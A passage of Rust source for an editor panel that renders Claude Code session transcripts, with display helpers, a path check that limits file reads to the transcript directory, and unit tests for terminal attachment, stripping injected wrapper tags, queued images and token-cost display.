    SharedString::from(line.unwrap_or_default().trim().to_string())
}

/// Wraps text in a fenced code block long enough that the text cannot close it early.
fn fenced_code(text: &str, language: &str) -> SharedString {
    let mut longest_backtick_run = 0;
    let mut current_run = 0;
    for character in text.chars() {
        if character == '`' {
            current_run += 1;
            longest_backtick_run = longest_backtick_run.max(current_run);
        } else {
            current_run = 0;
        }
    }

    let fence = "`".repeat(longest_backtick_run.max(2) + 1);
    SharedString::from(format!(
        "{fence}{language}\n{}\n{fence}",
        text.trim_end_matches('\n')
    ))
}

/// How a tool call's input is drawn: the text to show as code, and the language it is
/// highlighted in. An empty language leaves the text as plain code.
struct ToolInputDisplay {
    text: SharedString,
    language: &'static str,
}

impl ToolInputDisplay {
    fn code_block(&self) -> SharedString {
        fenced_code(&self.text, self.language)
    }
}

/// The language a file is written in, taken from its extension. An extension this panel
/// has no name for is left empty, which draws the text as plain code rather than
/// highlighting it as the wrong language.
fn language_for_path(path: &str) -> &'static str {
    let extension = Path::new(path)
        .extension()
        .and_then(|extension| extension.to_str())
        .unwrap_or_default();
    match extension {
        "rs" => "rust",
        "py" => "python",
        "ts" => "typescript",
        "tsx" => "tsx",
        "js" => "javascript",
        "jsx" => "jsx",
        "json" => "json",
        "md" => "markdown",
        "toml" => "toml",
        "yaml" | "yml" => "yaml",
        "sh" | "bash" => "bash",
        "go" => "go",
        "html" => "html",
        "css" => "css",
        _ => "",
    }
}

/// The field of a tool's input holding the text of the file the call is about, for the
/// tools that carry one; see [`FILE_TOOL_CONTENT_FIELDS`].
fn file_tool_content_field(tool_name: &str) -> Option<&'static str> {
    FILE_TOOL_CONTENT_FIELDS
        .iter()
        .find(|(name, _)| *name == tool_name)
        .map(|(_, field)| *field)
}

/// The input of a tool call as it is drawn. The entry carries the input as the JSON the
/// transcript holds, which is read back here rather than at build time so that how a
/// call is drawn stays out of the cached entries.
///
/// The language is only ever the file's when the text being drawn is the file's: a call
/// drawn as its own JSON has to be labelled as JSON, or a `Read` of a Rust file is shown
/// as a paragraph of Rust that is really JSON.
fn tool_input_display(tool_name: &str, input: &str) -> ToolInputDisplay {
    let parsed = serde_json::from_str::<Value>(input).ok();
    let field = |name: &str| {
        parsed
            .as_ref()
            .and_then(|parsed| parsed.get(name))
            .and_then(Value::as_str)
    };

    if tool_name == BASH_TOOL_NAME {
        return ToolInputDisplay {
            text: SharedString::from(field("command").unwrap_or(input).to_string()),
            language: "bash",
        };
    }

    // A call whose usual field is not there — an `Edit` that only sets `old_string`, a
    // call read while it was still being written — has nothing but its input left to show.
    if let Some(text) = file_tool_content_field(tool_name).and_then(field) {
        return ToolInputDisplay {
            text: SharedString::from(text.to_string()),
            language: field("file_path").map_or("", language_for_path),
        };
    }

    ToolInputDisplay {
        text: SharedString::from(input.to_string()),
        language: "json",
    }
}

/// Whether an output has more lines than are drawn before the rest is put behind a
/// disclosure. Counted lazily because an output can be megabytes and this runs on every
/// frame the entry is on screen.
fn output_is_clamped(text: &str, line_limit: usize) -> bool {
    text.lines().nth(line_limit).is_some()
}

/// The first `line_limit` lines of an output, taken as a prefix of the text rather than
/// as lines rejoined, so that what is drawn is exactly what the output starts with.
fn clamped_output(text: &str, line_limit: usize) -> &str {
    let end: usize = text
        .split_inclusive('\n')
        .take(line_limit)
        .map(str::len)
        .sum();
    text.get(..end).unwrap_or(text)
}

/// The expansion key of the output inside an entry. It is a key of its own so that
/// unclamping an output does not close the entry the output sits in.
fn output_expansion_key(key: &SharedString) -> SharedString {
    SharedString::from(format!("{key}#output"))
}

/// The key one sent file's fetched image is held under. Derived from the entry's own key
/// so that it survives a rebuild exactly as long as the entry does.
/// The key the prompt file of a CLI dispatch card is read under. Derived from the entry
/// rather than from the path, so that the read and the text it produces are dropped with
/// the entry they belong to and are kept while it is on screen.
fn dispatch_prompt_key(key: &SharedString) -> SharedString {
    SharedString::from(format!("{key}#dispatch-prompt"))
}

fn dispatch_report_key(key: &SharedString) -> SharedString {
    SharedString::from(format!("{key}#report"))
}

fn sent_file_key(key: &SharedString, file_index: usize) -> SharedString {
    SharedString::from(format!("{key}#file-{file_index}"))
}

/// Whether the panel will read this path back.
///
/// The path comes out of a file format that is private to Claude Code, so it is treated
/// as untrusted input: only an absolute path free of `..`, under the directory Claude
/// Code keeps its transcripts and their persisted outputs in, is ever opened. A path
/// outside it is still shown as text; it is only the offer to read the file that is
/// withheld, because a button that reads an arbitrary file is the risk here, and one
/// that fails is no use either.
fn persisted_output_is_loadable(path: &Path, home_directory: Option<&Path>) -> bool {
    // `None` means no scan has said yet which machine's home the path was written under.
    // There is nothing to check against then, so the offer is withheld: substituting this
    // machine's home would be an answer about the wrong machine on a remote project.
    let Some(home_directory) = home_directory else {
        return false;
    };

    path.is_absolute()
        && !path
            .components()
            .any(|component| component == Component::ParentDir)
        && path.starts_with(home_directory.join(".claude").join("projects"))
}

/// The persisted-output fields Claude Code writes beside a large tool result:
/// `persistedOutputPath` and `persistedOutputSize`. This is where the path comes from
/// whenever it is present, and the placeholder text is the fallback for the results that
/// carry no such field.
///
/// `inline_text` — the structured `stdout`, tens of kilobytes of it — stays the body that
/// is shown without asking, because the placeholder's preview holds only two. Reading the
/// whole file is a separate offer on top of it, not an alternative to it.
fn structured_persisted_output(
    result: Option<&Value>,
    inline_text: &str,
    home_directory: Option<&Path>,
) -> Option<PersistedOutput> {
    let result = result?.as_object()?;
    let path = PathBuf::from(result.get("persistedOutputPath").and_then(Value::as_str)?);
    // A path the panel will not read back is no reason to replace the text with a
    // "saved to a file" heading: the structured `stdout` is already the whole body.
    if !persisted_output_is_loadable(&path, home_directory) {
        return None;
    }

    let size = result
        .get("persistedOutputSize")
        .and_then(Value::as_u64)
        .map(describe_byte_count)
        .unwrap_or_else(|| "unknown size".to_string());

    Some(PersistedOutput {
        size: SharedString::from(size),
        path,
        preview: SharedString::from(inline_text.to_string()),
    })
}

/// Formats a byte count the way the placeholder text does, so that a size read from
/// `persistedOutputSize` and one read from the placeholder are shown alike.
fn describe_byte_count(bytes: u64) -> String {
    const KILOBYTE: f64 = 1024.;
    const MEGABYTE: f64 = KILOBYTE * KILOBYTE;

    let bytes_as_float = bytes as f64;
    if bytes_as_float >= MEGABYTE {
        format!("{:.1}MB", bytes_as_float / MEGABYTE)
    } else if bytes_as_float >= KILOBYTE {
        format!("{:.1}KB", bytes_as_float / KILOBYTE)
    } else {
        format!("{bytes}B")
    }
}

/// Recognizes the placeholder Claude Code writes in place of a tool output that was too
/// large to inline, which names the file the real output went to.
fn parse_persisted_output(text: &str) -> Option<PersistedOutput> {
    let body = text.split_once(PERSISTED_OUTPUT_MARKER)?.1;

    let path_start = body.find(PERSISTED_OUTPUT_PATH_PREFIX)? + PERSISTED_OUTPUT_PATH_PREFIX.len();
    let path_text = body.get(path_start..)?.lines().next()?.trim();
    let path = PathBuf::from(path_text);
    // A relative path has no meaningful base here, and a placeholder that does not name
    // a real file is better shown as ordinary text than as a broken load button.
    if path_text.is_empty() || !path.is_absolute() {
        return None;
    }

    let size = body
        .split_once(PERSISTED_OUTPUT_SIZE_PREFIX)
        .and_then(|(_, rest)| rest.split_once(')'))
        .map(|(size, _)| size.trim().to_string())
        .unwrap_or_else(|| "unknown size".to_string());

    let preview = body
        .find(PERSISTED_OUTPUT_PREVIEW_PREFIX)
        .and_then(|index| body.get(index..))
        .and_then(|section| section.split_once(":\n"))
        .map(|(_, preview)| preview.trim_end().to_string())
        .unwrap_or_else(|| body.trim().to_string());

    Some(PersistedOutput {
        size: SharedString::from(size),
        path,
        preview: SharedString::from(preview),
    })
}

fn persisted_output_text(contents: FileContents) -> String {
    let mut text = String::from_utf8_lossy(&contents.bytes).into_owned();
    if contents.truncated {
        text.push_str("\n\n… truncated by the panel; open the file above for the rest.");
    }
    text
}

/// Removes terminal escape sequences so that captured terminal output reads as text.
fn strip_ansi_escapes(input: &str) -> String {
    let mut output = String::with_capacity(input.len());
    let mut characters = input.chars();

    while let Some(character) = characters.next() {
        if character != '\u{1b}' {
            // The remaining control characters carry no meaning once the escapes are
            // gone, but newlines and tabs are part of the text.
            if character.is_control() && character != '\n' && character != '\t' {
                continue;
            }
            output.push(character);
            continue;
        }

        match characters.next() {
            // CSI: parameter and intermediate bytes, then a final byte in 0x40..=0x7e.
            Some('[') => {
                for following in characters.by_ref() {
                    if ('\u{40}'..='\u{7e}').contains(&following) {
                        break;
                    }
                    // No escape sequence spans a line. Output captured mid-sequence has
                    // lost its final byte, and scanning on for one would eat the lines
                    // that follow, so the newline ends the sequence and is kept.
                    if following == '\n' {
                        output.push('\n');
                        break;
                    }
                }
            }
            // OSC, DCS, SOS, PM and APC run until BEL or a string terminator.
            Some(']') | Some('P') | Some('X') | Some('^') | Some('_') => {
                let mut previous_was_escape = false;
                for following in characters.by_ref() {
                    if following == '\u{7}' || (previous_was_escape && following == '\\') {
                        break;
                    }
                    // These sequences have no final byte to fall back on, so an
                    // unterminated one would swallow the whole rest of the output.
                    if following == '\n' {
                        output.push('\n');
                        break;
                    }
                    previous_was_escape = following == '\u{1b}';
                }
            }
            // Any other escape is two characters long, and the second is consumed above.
            _ => {}
        }
    }

    output
}

/// Decodes standard or URL-safe base64, ignoring whitespace.
///
/// `base64` is not a dependency of this crate, and the only base64 the panel meets is the
/// payload of an image block, so the alphabet is decoded here rather than pulling in a
/// dependency for one call site.
fn decode_base64(input: &str) -> Option<Vec<u8>> {
    let mut output = Vec::with_capacity(input.len() / 4 * 3);
    let mut accumulator: u32 = 0;
    let mut bits: u32 = 0;

    for byte in input.bytes() {
        let value = match byte {
            b'A'..=b'Z' => byte - b'A',
            b'a'..=b'z' => byte - b'a' + 26,
            b'0'..=b'9' => byte - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' => break,
            b'\n' | b'\r' | b' ' | b'\t' => continue,
            _ => return None,
        };

        accumulator = (accumulator << 6) | u32::from(value);
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            output.push(((accumulator >> bits) & 0xff) as u8);
        }
    }

    Some(output)
}

#[cfg(test)]
mod tests {
    use crate::session_registry::SlashCommand;

    #[test]
    fn a_main_pane_embeds_a_terminal_only_for_an_attachable_live_session() {
        let wanted = wanted_terminal(true, true, Some(("session-1", 42, Some("zed:@6.%8"))));
        assert_eq!(
            wanted,
            Some(TerminalTarget {
                pane: "%8".to_string(),
                process_id: 42,
            })
        );
        assert!(crate::session_registry::attach_arguments("zed:@6.%8").is_some());
    }

    #[test]
    fn the_dock_does_not_embed_a_terminal() {
        assert_eq!(
            wanted_terminal(false, true, Some(("session-1", 42, Some("zed:@6.%8")))),
            None
        );
    }

    #[test]
    fn a_subagent_does_not_embed_a_terminal() {
        assert_eq!(
            wanted_terminal(true, false, Some(("session-1", 42, Some("zed:@6.%8")))),
            None
        );
    }

    #[test]
    fn an_ended_session_does_not_embed_a_terminal() {
        assert_eq!(wanted_terminal(true, true, None), None);
    }

    #[test]
    fn a_live_session_without_a_tmux_target_does_not_embed_a_terminal() {
        assert_eq!(
            wanted_terminal(true, true, Some(("session-1", 42, None))),
            None
        );
    }

    #[test]
    fn a_tmux_target_embeds_a_terminal_only_when_attach_arguments_accepts_it() {
        for tmux_target in [
            "zed:@6.%8",
            "zed:6.%8",
            "my work:@1.%1",
            "zed:@6.pane",
            "",
            "awp:@1",
        ] {
            let wanted = wanted_terminal(true, true, Some(("session-1", 7, Some(tmux_target))));
            assert_eq!(
                wanted.is_some(),
                crate::session_registry::attach_arguments(tmux_target).is_some(),
                "{tmux_target}"
            );
        }
    }

    /// `/clear` leaves the process and the tmux pane where they are and only rebinds the
    /// conversation id. A terminal keyed on the conversation would be torn down — and a
    /// second mirror minted — every time the reader cleared their context.
    #[test]
    fn clearing_the_conversation_keeps_the_terminal_that_is_already_attached() {
        let before = wanted_terminal(true, true, Some(("before-clear", 42, Some("zed:@6.%8"))));
        let after = wanted_terminal(true, true, Some(("after-clear", 42, Some("zed:@6.%8"))));
        assert!(
            before.is_some(),
            "an attachable live session wants a terminal"
        );
        assert_eq!(
            before, after,
            "the same process on the same pane is the same terminal to attach to"
        );
    }

    /// The identity that survives a `/clear` still has to notice a real move: another
    /// process, or the same process registered on another pane.
    #[test]
    fn another_process_or_another_pane_is_another_terminal() {
        let attached = wanted_terminal(true, true, Some(("session-1", 42, Some("zed:@6.%8"))));
        assert_ne!(
            attached,
            wanted_terminal(true, true, Some(("session-1", 43, Some("zed:@6.%8")))),
            "another process holding the pane is another session to attach to"
        );
        assert_ne!(
            attached,
            wanted_terminal(true, true, Some(("session-1", 42, Some("zed:@7.%9")))),
            "the same process registered on another pane has to be attached again"
        );
    }

    /// `/clear` keeps the client, so the attach that would mint another mirror does not
    /// run. [`TerminalSync::Keep`] is the branch that returns before `attach_arguments`.
    #[test]
    fn clearing_the_conversation_does_not_read_attach_arguments() {
        let before = wanted_terminal(true, true, Some(("before-clear", 42, Some("zed:@6.%8"))));
        let after = wanted_terminal(true, true, Some(("after-clear", 42, Some("zed:@6.%8"))));
        assert_eq!(
            terminal_sync(before.as_ref(), after.as_ref()),
            TerminalSync::Keep,
            "the same pane and process must not re-read attach_arguments"
        );
    }

    /// The client already on screen is not kept when the registry disagrees with it.
    /// Another process re-attaches, and that is the only time `attach_arguments` is
    /// read. An ended session drops the client and does not mint a mirror for it.
    #[test]
    fn a_changed_process_reattaches_and_an_ended_session_drops_the_terminal() {
        let attached = wanted_terminal(true, true, Some(("session-1", 42, Some("zed:@6.%8"))));
        let replaced_process =
            wanted_terminal(true, true, Some(("session-1", 43, Some("zed:@6.%8"))));
        assert_eq!(
            terminal_sync(attached.as_ref(), replaced_process.as_ref()),
            TerminalSync::Attach,
            "another process on the same pane has to read attach_arguments"
        );
        let ended = wanted_terminal(true, true, None);
        assert_eq!(
            terminal_sync(attached.as_ref(), ended.as_ref()),
            TerminalSync::Drop,
            "an ended session drops the client and does not read attach_arguments"
        );
    }

    /// [`TerminalSync::Keep`] is the client that is already attached, and nothing else.
    /// The first time a pane becomes attachable, and a move onto another pane, still
    /// read `attach_arguments`. An idle panel with nothing selected must not attach.
    #[test]
    fn keep_does_not_swallow_the_first_attach_or_a_pane_move() {
        let attached = wanted_terminal(true, true, Some(("session-1", 42, Some("zed:@6.%8"))));
        assert_eq!(
            terminal_sync(None, attached.as_ref()),
            TerminalSync::Attach,
            "the first attach has to read attach_arguments"
        );
        let moved = wanted_terminal(true, true, Some(("session-1", 42, Some("zed:@7.%9"))));
        assert_eq!(
            terminal_sync(attached.as_ref(), moved.as_ref()),
            TerminalSync::Attach,
            "another pane is another attach"
        );
        assert_eq!(
            terminal_sync(None, None),
            TerminalSync::Keep,
            "nothing selected does not mint a mirror"
        );
    }

    use super::*;

    use std::sync::{
        Mutex,
        atomic::{AtomicUsize, Ordering},
    };

    use crate::LiveMessage;
    use crate::SubagentMeta;
    use crate::session_registry::{ChannelStatus, SessionSummary, TailProgress, TailState};
    use crate::session_source::SessionListing;
    use crate::session_store::REGISTRY_SCAN_TIMEOUT;
    use crate::transcript::parse_record;

    fn record(json: &str) -> TranscriptRecord {
        match parse_record(json) {
            Ok(Some(record)) => record,
            Ok(None) => panic!("expected a record, got a blank line for: {json}"),
            Err(error) => panic!("expected {json} to parse, got error: {error:#}"),
        }
    }

    fn entries_of_with_home(json_lines: &[&str], home_directory: Option<&Path>) -> Vec<Entry> {
        let records: Vec<TranscriptRecord> = json_lines.iter().map(|line| record(line)).collect();
        let path: Vec<&TranscriptRecord> = records.iter().collect();
        build_entries(&path, home_directory, &mut EntryCache::default())
    }

    /// The fixtures of every test that is not about the boundary itself write their paths
    /// under this machine's home, which is what a local project's scan reports.
    fn entries_of(json_lines: &[&str]) -> Vec<Entry> {
        entries_of_with_home(json_lines, Some(paths::home_dir()))
    }

    /// One line of JSON for a user record whose whole message is `text`.
    fn user_message_line(uuid: &str, text: &str) -> String {
        serde_json::json!({
            "type": "user",
            "uuid": uuid,
            "message": { "content": text },
        })
        .to_string()
    }

    /// The shape Claude Code writes for a message that arrived over the Zed channel.
    fn channel_record_line(uuid: &str, content: &str) -> String {
        serde_json::json!({
            "parentUuid": "60e4f7a8-parent",
            "isSidechain": false,
            "type": "user",
            "message": {
                "role": "user",
                "content": content,
            },
            "isMeta": true,
            "uuid": uuid,
            "timestamp": "2026-09-18T13:43:20.174Z",
            "permissionMode": "auto",
            "origin": {"kind": "channel", "server": "zed-claude"},
            "promptSource": "system",
            "queueSkipAttachments": true,
            "userType": "external",
            "entrypoint": "cli",
            "sessionId": "1cd663f5-session",
            "version": "2.1.276",
        })
        .to_string()
    }

    fn channel_envelope(inner: &str) -> String {
        format!(
            "<channel source=\"zed-claude\" from=\"zed\" sent_at_ms=\"1789739000145\">\n{inner}\n</channel>"
        )
    }

    fn entry_holds_channel_open(entry: &Entry) -> bool {
        match &entry.kind {
            EntryKind::Message { source, .. } => source.contains("<channel"),
            EntryKind::SystemNote { text, .. } => text.contains("<channel"),
            EntryKind::Unknown { label, raw } => {
                label.contains("<channel") || raw.contains("<channel")
            }
            EntryKind::Queued { text } => text.contains("<channel"),
            EntryKind::LocalCommand { text } => text.contains("<channel"),
            EntryKind::SlashCommand { text } => text.contains("<channel"),
            EntryKind::Thinking { source } => source.contains("<channel"),
            _ => false,
        }
    }

    /// What the session has spent is not what it is carrying: the context figure is the
    /// size of one request, and says nothing about the work that has gone through the
    /// session to reach it.
    #[test]
    fn the_toolbar_says_the_tokens_the_session_has_spent() {
        let spend = Spend {
            usage: Usage {
                input_tokens: 12_000,
                cache_read_tokens: 480_000,
                cache_write_5m_tokens: 40_000,
                cache_write_1h_tokens: 8_000,
                output_tokens: 63_000,
                ..Default::default()
            },
            answers: 4,
            context_tokens: 94_000,
            ..Default::default()
        };

        assert!(
            session_facts(&spend).contains(&SharedString::from("540K in \u{b7} 63K out")),
            "every kind of input counts towards what was read, got {:?}",
            session_facts(&spend)
        );
    }

    /// A message typed while the session was answering carries its image the same way
    /// any other message does — the attachment's `prompt` is content blocks rather than
    /// a string when there is one. Reading only the text out of those blocks drops the
    /// image the reader pasted, and it is nowhere else: the user record written when the
    /// turn ends carries no content at all.
    #[test]
    fn a_message_queued_with_an_image_keeps_the_image() {
        let queued = serde_json::json!({
            "type": "attachment",
            "uuid": "q1",
            "attachment": {
                "type": "queued_command",
                "prompt": [
                    {"type": "text", "text": "look at this"},
                    {
                        "type": "image",
                        "source": {
                            "type": "base64",
                            "media_type": "image/png",
                            "data": "aGVsbG8=",
                        },
                    },
                ],
            },
        })
        .to_string();

        let entries = entries_of(&[&queued]);

        assert_eq!(
            message_sources(&entries),
            vec![SharedString::from("look at this")],
            "the words typed with the image are still the message"
        );
        assert_eq!(
            decoded_image(&entries).bytes,
            b"hello".to_vec(),
            "the image pasted with them must be drawn too"
        );
    }

    #[test]
    fn a_message_queued_with_only_an_image_keeps_the_image() {
        let queued = serde_json::json!({
            "type": "attachment",
            "uuid": "q-image-only",
            "attachment": {
                "type": "queued_command",
                "prompt": [{
                    "type": "image",
                    "source": {
                        "type": "base64",
                        "media_type": "image/png",
                        "data": "aGVsbG8=",
                    },
                }],
            },
        })
        .to_string();

        let entries = entries_of(&[&queued]);
        let actual = entries
            .iter()
            .filter(|entry| matches!(&entry.kind, EntryKind::Image { .. }))
            .count();
        assert_eq!(
            actual, 1,
            "an image-only queued command must draw one image; expected 1, got {actual}"
        );
    }

    #[test]
    fn replacing_a_queued_image_for_one_uuid_invalidates_its_cached_decode() {
        let queued = |data: &str| {
            serde_json::json!({
                "type": "attachment",
                "uuid": "q-cache",
                "attachment": {
                    "type": "queued_command",
                    "prompt": [
                        {"type": "text", "text": "look"},
                        {
                            "type": "image",
                            "source": {
                                "type": "base64",
                                "media_type": "image/png",
                                "data": data,
                            },
                        },
                    ],
                },
            })
            .to_string()
        };
        let first_record = record(&queued("aGVsbG8="));
        let replacement_record = record(&queued("d29ybGQ="));
        let mut cache = EntryCache::default();

        let first_entries = build_entries(&[&first_record], None, &mut cache);
        assert_eq!(decoded_image(&first_entries).bytes, b"hello".to_vec());

        cache.forget_record("q-cache");
        let replacement_entries = build_entries(&[&replacement_record], None, &mut cache);
        let actual = decoded_image(&replacement_entries).bytes.clone();
        assert_eq!(
            actual,
            b"world".to_vec(),
            "the replacement record carries a new image; expected bytes {:?}, got {actual:?}",
            b"world"
        );
    }

    /// A session that has not answered yet has spent nothing, and a zero says less than
    /// nothing at all.
    #[test]
    fn the_toolbar_says_no_tokens_for_a_session_that_has_not_answered() {
        let spend = Spend::default();
        assert!(
            !session_facts(&spend)
                .iter()
                .any(|fact| fact.contains("in \u{b7}")),
            "got {:?}",
            session_facts(&spend)
        );
    }

    fn message_sources(entries: &[Entry]) -> Vec<SharedString> {
        entries
            .iter()
            .filter_map(|entry| match &entry.kind {
                EntryKind::Message { source, .. } => Some(source.clone()),
                _ => None,
            })
            .collect()
    }

    /// The dock side the user dragged the panel to has to be there after a restart, and
    /// nothing the panel holds itself outlives one. The default is the left-hand dock:
    /// the project panel defaults to the right one, and two panels sharing a dock take
    /// turns being the visible one instead of being readable side by side.
    #[gpui::test]
    async fn the_dock_side_is_read_from_the_settings(cx: &mut gpui::TestAppContext) {
        cx.update(|cx| {
            let settings_store = settings::SettingsStore::test(cx);
            cx.set_global(settings_store);

            assert_eq!(
                ClaudeSessionsSettings::get_global(cx).dock,
                DockSide::Left,
                "the left-hand dock is the one the project panel is not already in"
            );

            <settings::SettingsStore as gpui::UpdateGlobal>::update_global(cx, |store, cx| {
                store.update_user_settings(cx, |content| {
                    content.claude_sessions.get_or_insert_default().dock = Some(DockSide::Right);
                });
            });

            assert_eq!(
                ClaudeSessionsSettings::get_global(cx).dock,
                DockSide::Right,
                "the side in the settings is the side the panel opens on, not the default"
            );
        });
    }

    #[test]
    fn only_the_two_side_docks_are_offered() {
        let positions: Vec<DockPosition> = vec![
            dock_position(DockSide::Left),
            dock_position(DockSide::Right),
        ];
        assert_eq!(
            positions,
            vec![DockPosition::Left, DockPosition::Right],
            "the panel is a side panel; the bottom dock is not one of its positions"
        );
    }

    /// What the count has to be right about for the button to be worth having: it names
    /// how many messages the reader has not seen, not how many the conversation holds.
    #[test]
    fn entries_that_land_below_the_window_are_counted_until_the_reader_gets_there() {
        let mut unread = UnreadBelow::default();

        unread.entries_arrived(4, true);
        assert_eq!(
            unread.count(),
            0,
            "at the bottom the list follows the tail, so these were scrolled into view"
        );

        unread.entries_arrived(2, false);
        unread.entries_arrived(1, false);
        assert_eq!(
            unread.count(),
            3,
            "the count is what has arrived since the reader was last at the bottom"
        );

        unread.scrolled(false);
        assert_eq!(
            unread.count(),
            3,
            "scrolling that does not reach the bottom has read none of them"
        );

        unread.scrolled(true);
        assert_eq!(
            unread.count(),
            0,
            "reaching the bottom is reading them, and the button has nothing left to offer"
        );

        // What arrives after that is counted from zero again, not from the total.
        unread.entries_arrived(1, false);
        assert_eq!(unread.count(), 1);
    }

    /// A session the reader has just opened shows them the newest of that conversation,
    /// so nothing about where they were in the previous one carries over.
    #[test]
    fn a_new_session_starts_with_nothing_unread() {
        let mut unread = UnreadBelow::default();
        unread.entries_arrived(9, false);
        unread.reset();
        assert_eq!(
            unread.count(),
            0,
            "the count belongs to the conversation that was being read, not to the panel"
        );
    }

    /// Collapsed, the list gives up its rows, so the one line that is left has to say
    /// what the rows were saying: how many sessions are running, and which one the
    /// conversation below belongs to.
    #[test]
    fn a_collapsed_session_list_keeps_the_count_and_the_name_of_the_open_session() {
        let summaries: Vec<SharedString> = vec![
            collapsed_sessions_summary(0, None),
            collapsed_sessions_summary(1, None),
            collapsed_sessions_summary(1, Some("alpha")),
            collapsed_sessions_summary(7, Some("zed panel")),
        ];
        assert_eq!(
            summaries,
            vec![
                SharedString::from("0 sessions"),
                SharedString::from("1 session"),
                SharedString::from("1 session · alpha"),
                SharedString::from("7 sessions · zed panel"),
            ],
            "the collapsed header is the only place these are visible"
        );
    }

    #[test]
    fn every_injected_wrapper_is_cut_out_of_a_user_message() {
        let wrappers = [
            "<system-reminder>never mention this reminder</system-reminder>",
            "<task-notification>a background task finished</task-notification>",
            "<persisted-output>the rest went to a file</persisted-output>",
            // The opening tag of this one carries attributes.
            "<codegraph_context note=\"Structural context from CodeGraph\">symbols</codegraph_context>",
            "<local-command-stdout>total 0</local-command-stdout>",
        ];

        let visible: Vec<Option<String>> = wrappers
            .iter()
            .map(|wrapper| user_visible_text(&format!("what I actually typed\n\n{wrapper}")))
            .collect();
        assert_eq!(
            visible,
            vec![Some("what I actually typed".to_string()); wrappers.len()],
            "each of {wrappers:#?} is context Claude Code injected, not words the user typed"
        );
    }

    #[test]
    fn a_user_record_of_nothing_but_injected_context_is_not_shown_at_all() {
        let only_a_wrapper =
            "<task-notification>\nthe agent you spawned has finished\n</task-notification>";
        assert_eq!(
            user_visible_text(only_a_wrapper),
            None,
            "there is no message in this record to show"
        );

        let entries = entries_of(&[
            &user_message_line("a", only_a_wrapper),
            &user_message_line("b", "a message of my own"),
        ]);
        assert_eq!(
            message_sources(&entries),
            vec![SharedString::from("a message of my own")],
            "the injected record must be left out of the conversation, not drawn as an \
             empty bubble"
        );
    }

    #[test]
    fn two_injected_blocks_in_one_message_both_go() {
        let text = "<system-reminder>first</system-reminder>the middle is mine\
                    <task-notification>second</task-notification>";
        assert_eq!(
            user_visible_text(text).as_deref(),
            Some("the middle is mine"),
            "both wrappers have to go, and what sat between them has to stay"
        );

        // Nested, and nested in one of its own kind: the block ends at the closing tag
        // that matches its opening tag, not at the first one in the text.
        let nested = "before<system-reminder>outer<system-reminder>inner</system-reminder>\
                      still the reminder</system-reminder>after";
        assert_eq!(
            user_visible_text(nested).as_deref(),
            Some("beforeafter"),
            "a wrapper nested inside one of its own kind must not end the outer one early"
        );
    }

    /// A transcript read while it is being written ends in a line that is only partly
    /// there, so an opening tag whose closing tag has not been written yet is normal.
    #[test]
    fn an_injected_block_with_no_closing_tag_takes_nothing_with_it() {
        let truncated = "what I typed\n<system-reminder>the record ends mid-";
        assert_eq!(
            user_visible_text(truncated).as_deref(),
            Some(truncated),
            "with no closing tag there is no block to cut out, and guessing where it \
             would have ended would eat the rest of the record"
        );

        // What the guard must not kill: a wrapper that is closed is still cut out, even
        // when an unterminated one sits in front of it.
        let after_the_truncated_one =
            "<system-reminder>unterminated<task-notification>closed</task-notification>";
        assert_eq!(
            user_visible_text(after_the_truncated_one).as_deref(),
            Some("<system-reminder>unterminated"),
            "the closed wrapper has to go even though the one before it never closed"
        );
    }

    #[test]
    fn only_a_user_record_is_filtered() {
        let reminder = "<system-reminder>this stays</system-reminder> and more";
        let assistant = serde_json::json!({
            "type": "assistant",
            "uuid": "a",
            "message": { "content": [ { "type": "text", "text": reminder } ] },
        })
        .to_string();
        let entries = entries_of(&[&assistant]);
        assert_eq!(
            message_sources(&entries),
            vec![SharedString::from(reminder)],
            "the model's own words are shown as it wrote them"
        );

        // A tool result is not a message either, and it is where the persisted-output
        // marker is actually meant to be read.
        let tool_result = serde_json::json!({
            "type": "user",
            "uuid": "c",
            "message": { "content": [ {
                "type": "tool_result",
                "tool_use_id": "t1",
                "content": "<system-reminder>tool output</system-reminder>",
            } ] },
        })
        .to_string();
        let entries = entries_of(&[TOOL_USE_LINE, &tool_result]);
        assert_eq!(
            entries.len(),
            2,
            "a tool result must still be shown, got {} entries",
            entries.len()
        );
        assert_eq!(
            match &entries[1].kind {
                EntryKind::ToolResult { body, .. } => body.clone(),
                _ => panic!("expected the second entry to be a tool result"),
            },
            ToolResultBody::Inline(SharedString::from(
                "<system-reminder>tool output</system-reminder>"
            )),
            "a tool result is not the user's words and must be shown verbatim"
        );
    }

    #[test]
    fn a_reminder_appended_to_a_user_message_leaves_the_message() {
        // The shape a real message has: the user's words, then the reminder Claude Code
        // appended to them.
        let entries = entries_of(&[&user_message_line(
            "a",
            "please read the file\n<system-reminder>The user opened a file.</system-reminder>",
        )]);
        assert_eq!(
            message_sources(&entries),
            vec![SharedString::from("please read the file")],
            "the message is the user's; the reminder appended to it is not"
        );
    }

    #[test]
    fn string_and_array_message_content_both_render() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","message":{"content":"plain string"}}"#,
            r#"{"type":"assistant","uuid":"b","message":{"content":[{"type":"text","text":"in an array"}]}}"#,
        ]);

        assert_eq!(entries.len(), 2);
        assert!(matches!(
            &entries[0].kind,
            EntryKind::Message { source, .. } if source.as_ref() == "plain string"
        ));
        assert!(matches!(
            &entries[1].kind,
            EntryKind::Message { source, .. } if source.as_ref() == "in an array"
        ));
    }

    #[test]
    fn tool_result_prefers_the_structured_tool_use_result() {
        let entries = entries_of(&[
            r#"{"type":"assistant","uuid":"a","message":{"content":[{"type":"tool_use","id":"t1","name":"Bash","input":{"command":"ls"}}]}}"#,
            r#"{"type":"user","uuid":"b","toolUseResult":{"stdout":"from stdout","stderr":""},
                "message":{"content":[{"type":"tool_result","tool_use_id":"t1","content":"from the content block"}]}}"#,
        ]);

        let EntryKind::ToolResult { label, body, .. } = &entries[1].kind else {
            panic!("expected a tool result, got something else");
        };
        assert_eq!(label.as_ref(), "Bash");
        assert_eq!(
            body,
            &ToolResultBody::Inline(SharedString::from("from stdout"))
        );
    }

    /// Claude Code's own total is preferred because it prices every model it ran; the
    /// derived one is marked so that a reader can tell which they are looking at.
    #[test]
    fn the_reported_total_wins_and_a_derived_one_says_so() {
        let mut spend = Spend {
            model: Some("claude-opus-5".into()),
            usage: Usage {
                output_tokens: 1_000_000,
                ..Default::default()
            },
            ..Default::default()
        };

        assert_eq!(
            session_cost(&spend).as_deref(),
            Some("~$25"),
            "derived from the token counts, and marked as derived"
        );

        spend.reported = Some(crate::transcript::ReportedCost {
            total_usd: 173.309_849_25,
